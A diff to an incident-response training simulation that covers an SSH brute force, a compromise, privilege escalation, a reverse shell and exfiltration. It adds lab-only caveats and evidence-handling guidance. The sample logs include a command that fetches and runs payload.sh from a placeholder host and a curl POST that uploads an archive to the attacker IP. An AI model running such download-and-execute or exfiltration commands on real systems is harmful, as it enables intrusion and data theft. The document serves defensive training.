@@ -1,4 +1,6 @@
 
+> **LAB SIMULATION NOTICE:** This document is a hypothetical tabletop/lab scenario. Unless a specific artefact from an authorised lab is attached, the event timeline, accounts, process names, findings, attack counts and attribution below are **SIMULATED** and must not be described as a real compromise. Public example IPs are documentation-only ranges.
+
 # Full-Scale Security Incident Simulation
 
 ## Scenario: Brute Force → Successful Compromise → Privilege Escalation → Persistence Attempt
@@ -30,11 +32,11 @@ SIEM generates alert:
 ## Log Evidence – `/var/log/auth.log`
 
 ```
-Feb 13 01:12:03 server sshd[3021]: Failed password for root from 185.234.219.77 port 51122 ssh2
-Feb 13 01:12:05 server sshd[3024]: Failed password for root from 185.234.219.77 port 51125 ssh2
-Feb 13 01:12:07 server sshd[3028]: Failed password for admin from 185.234.219.77 port 51129 ssh2
-Feb 13 01:12:09 server sshd[3032]: Failed password for user from 185.234.219.77 port 51131 ssh2
-Feb 13 01:12:12 server sshd[3035]: Failed password for test from 185.234.219.77 port 51135 ssh2
+Feb 13 01:12:03 server sshd[3021]: Failed password for root from 198.51.100.77 port 51122 ssh2
+Feb 13 01:12:05 server sshd[3024]: Failed password for root from 198.51.100.77 port 51125 ssh2
+Feb 13 01:12:07 server sshd[3028]: Failed password for admin from 198.51.100.77 port 51129 ssh2
+Feb 13 01:12:09 server sshd[3032]: Failed password for user from 198.51.100.77 port 51131 ssh2
+Feb 13 01:12:12 server sshd[3035]: Failed password for test from 198.51.100.77 port 51135 ssh2
 ```
 
 ### Pattern Recognition
@@ -56,7 +58,7 @@ MITRE Mapping:
 ### Count Attempts
 
 ```bash
-grep "185.234.219.77" /var/log/auth.log | wc -l
+grep "198.51.100.77" /var/log/auth.log | wc -l
 ```
 
 Result:
@@ -74,7 +76,7 @@ Result:
 New log appears:
 
 ```
-Feb 13 01:18:44 server sshd[3188]: Accepted password for admin from 185.234.219.77 port 51421 ssh2
+Feb 13 01:18:44 server sshd[3188]: Accepted password for admin from 198.51.100.77 port 51421 ssh2
 ```
 
 ⚠ Now this escalates from attempt → confirmed breach.
@@ -87,7 +89,7 @@ Immediately after successful login:
 
 ```
 Feb 13 01:19:01 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash
-Feb 13 01:19:04 server sudo: admin : TTY=pts/0 ; COMMAND=/usr/bin/wget http://malicious.site/payload.sh
+Feb 13 01:19:04 server sudo: admin : TTY=pts/0 ; COMMAND=/usr/bin/wget http://example.invalid/payload.sh
 Feb 13 01:19:05 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/bash payload.sh
 ```
 
@@ -152,12 +154,14 @@ Severity: High
 ## Step 1 – Isolate System from Network
 
 ```bash
+# LAB ONLY — disconnecting an interface can sever remote access and affect availability. Preserve required evidence first where feasible; use approved EDR/network isolation controls in a real environment.
 sudo ip link set eth0 down
 ```
 
 Or firewall drop all outbound:
 
 ```bash
+# LAB ONLY — this blocks all outbound traffic and may disrupt legitimate services or your remote session. Use only on a disposable, authorised lab host after assessing impact.
 sudo iptables -P OUTPUT DROP
 ```
 
@@ -168,7 +172,7 @@ Goal: Stop data exfiltration.
 ## Step 2 – Block Attacker IP
 
 ```bash
-sudo ufw deny from 185.234.219.77
+sudo ufw deny from 198.51.100.77
 ```
 
 ---
@@ -186,12 +190,14 @@ sudo passwd -l admin
 ## Remove Malicious Process
 
 ```bash
+# LAB ONLY — force-killing a process may destroy volatile evidence. Collect required process, memory and connection artefacts first when feasible; document any urgent exception.
 sudo kill -9 4231
 ```
 
 Remove file:
 
 ```bash
+# LAB ONLY — do not delete suspected malware before evidence preservation and incident-response approval. Work from a preserved copy where possible.
 rm -f payload.sh
 ```
 
@@ -251,7 +257,7 @@ netstat -antp
 Suspicious connection:
 
 ```
-185.234.219.77:4444 ESTABLISHED
+198.51.100.77:4444 ESTABLISHED
 ```
 
 Reverse shell suspected.
@@ -465,13 +471,13 @@ This aligns with:
 Outbound network logs show:
 
 ```
-Feb 13 01:27:41 HostB curl -X POST http://185.234.219.77/upload --data-binary @/tmp/webdata.tar.gz
+Feb 13 01:27:41 HostB curl -X POST http://198.51.100.77/upload --data-binary @/tmp/webdata.tar.gz
 ```
 
 Simultaneously:
 
 ```
-ESTABLISHED 10.0.0.22:44122 → 185.234.219.77:80
+ESTABLISHED 10.0.0.22:44122 → 198.51.100.77:80
 ```
 
 ### Interpretation
@@ -500,6 +506,7 @@ Given the scale of compromise, containment strategy transitioned from host-level
 * Blocked outbound traffic from compromised hosts
 
 ```
+# LAB ONLY — this drops forwarded traffic from the entire subnet and may cause broad service outages. Apply only in an isolated test network with a rollback plan.
 iptables -A FORWARD -s 10.0.0.0/24 -j DROP
 ```
 
@@ -647,3 +654,42 @@ No ransomware deployment observed. No confirmed encryption activity.
 
 
 
+
+
+---
+
+# Evidence Handling, Timeline and Containment Caveats
+
+## Evidence integrity
+
+Before taking destructive actions, preserve relevant authentication, endpoint, process, network and application artefacts using the authorised collection procedure. Record who collected each item, source host/path, timestamp and time zone, collection method, tool/version and any transformations. Keep a read-only original and analyse a working copy.
+
+Calculate a SHA-256 hash for each collected file and store it in an evidence manifest. A hash helps detect subsequent changes to that file; it does not alone prove the source is authentic or that evidence collection was complete. Record custody transfers and access to evidence. If urgent containment must precede collection, document why, who authorised it, which evidence may be lost and what was preserved.
+
+Example, run against an evidence copy in a lab:
+
+```bash
+sha256sum auth.log evidence-copy.log
+```
+
+Do not run deletion, cleanup, or remediation commands on original evidence. Redact credentials, tokens, internal hostnames and personal information before publishing a report.
+
+## Interpretation discipline
+
+Repeated authentication failures support an investigation hypothesis; they do not independently prove compromise. An accepted login after failures is stronger evidence of successful authentication, but attribution to the same actor requires correlation. Process output, service creation, file retrieval and lateral movement statements should be tied to specific event records or explicitly labelled as scenario assumptions.
+
+For this simulation, the IP values in the narrative have been changed to documentation-only values: `198.51.100.77` for the example external source and private RFC 1918 addresses for internal lab hosts. The domain `example.invalid` is deliberately non-resolving placeholder text. Do not interpret these values as real attacker infrastructure.
+
+## Safer containment guidance
+
+- Prefer a narrowly scoped, approved EDR or network isolation action over disabling an interface or setting all outbound traffic to DROP without assessing operational impact.
+- Do not indiscriminately flush firewall rules or disable networking on a remote host; doing so can interrupt services and strand the responder.
+- Preserve volatile evidence and record running processes, sockets, logged-on sessions and relevant memory where the incident process requires it and collection is feasible.
+- Disable or reset a compromised account through approved identity controls, validate dependent services and rotate affected credentials from a trusted system.
+- Terminate processes or remove suspected payloads only after necessary evidence has been preserved, unless immediate harm makes earlier containment necessary.
+- Validate eradication and recovery, restore least privilege, verify logging, and monitor for recurrence.
+- Any command in this document is illustrative and lab-only; adapt it to the actual operating system, network topology, incident plan and change-approval requirements.
+
+## Scope of the exercise
+
+This document is a training simulation, not evidence that a real intrusion, malware execution, exfiltration or lateral-movement event occurred. The reported attempt count and outcomes must be reproducible from a supplied dataset before being treated as measured results. If that dataset is unavailable, label the numbers as assumed scenario details rather than observations.
